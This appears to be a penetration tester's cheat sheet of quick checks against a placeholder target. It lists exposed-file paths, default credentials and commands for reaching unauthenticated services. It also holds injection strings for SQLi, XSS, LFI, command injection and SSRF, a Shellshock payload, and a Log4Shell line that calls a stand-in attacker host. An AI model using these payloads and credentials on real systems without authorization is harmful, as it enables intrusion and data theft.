# Quick Wins — Fast Checks for Initial Assessment

## Information Disclosure

```bash
# Exposed files & directories
/.git/HEAD
/.git/config
/.env
/.DS_Store
/robots.txt
/sitemap.xml
/.well-known/security.txt
/crossdomain.xml
/clientaccesspolicy.xml
/server-status  (Apache mod_status)
/server-info    (Apache mod_info)
/phpinfo.php
/info.php
/wp-config.php.bak
/web.config
/config.yaml
/config.json
/.htpasswd
/backup.zip
/backup.sql
/dump.sql
/database.sql

# Version disclosure
curl -sI TARGET | grep -iE "server|x-powered|x-aspnet"
```

## Default Credentials

```
admin:admin
admin:password
admin:changeme
admin:admin123
root:root
root:toor
test:test
guest:guest
user:user
administrator:administrator
tomcat:tomcat (Tomcat Manager)
admin:tomcat
manager:manager
postgres:postgres (PostgreSQL)
sa: (MSSQL empty password)
```

## Common Vulnerable Services

```bash
# Anonymous FTP
ftp TARGET  # try anonymous/anonymous

# Open SMB shares
smbclient -L //TARGET -N
smbclient //TARGET/share -N

# NFS exports
showmount -e TARGET

# Redis (no auth)
redis-cli -h TARGET INFO

# MongoDB (no auth)
mongosh --host TARGET --eval "db.adminCommand('listDatabases')"

# Elasticsearch (no auth)
curl http://TARGET:9200/_cat/indices

# Memcached
echo "stats" | nc TARGET 11211

# MySQL (no password)
mysql -h TARGET -u root

# SNMP (default community)
snmpwalk -v2c -c public TARGET
```

## Quick Vulnerability Checks

```bash
# Nmap vulnerability scan
nmap -sV --script vuln TARGET

# HTTP methods (PUT, DELETE, etc.)
curl -X OPTIONS TARGET -sI | grep Allow

# Directory listing
curl TARGET/images/ TARGET/uploads/ TARGET/backup/ TARGET/tmp/ 2>/dev/null | grep "Index of"

# Shellshock (CGI)
curl -H "User-Agent: () { :; }; echo; /bin/id" http://TARGET/cgi-bin/status

# Heartbleed
nmap --script ssl-heartbleed -p 443 TARGET

# EternalBlue
nmap --script smb-vuln-ms17-010 TARGET

# Log4Shell
curl -H "X-Api-Version: \${jndi:ldap://ATTACKER/test}" http://TARGET
```

## Web Application Quick Tests

```
# SQLi
' OR 1=1--
" OR ""="
' OR '1'='1

# XSS
<script>alert(1)</script>
"><img src=x onerror=alert(1)>

# SSTI
{{7*7}}  → if returns 49, template injection
${7*7}   → alternative syntax

# LFI
../../../etc/passwd
..%2F..%2F..%2Fetc/passwd

# Command injection
; id
| id
$(id)

# SSRF
http://127.0.0.1
http://169.254.169.254/latest/meta-data/  (cloud metadata)
```

## Enumeration Priority Order

1. **Ports & services** → nmap -sV -sC
2. **Web directories** → ffuf/gobuster
3. **Default creds** → check every login form
4. **Known CVEs** → searchsploit, nmap vuln scripts
5. **Information disclosure** → .git, .env, backups
6. **Injection points** → every input field, parameter, header
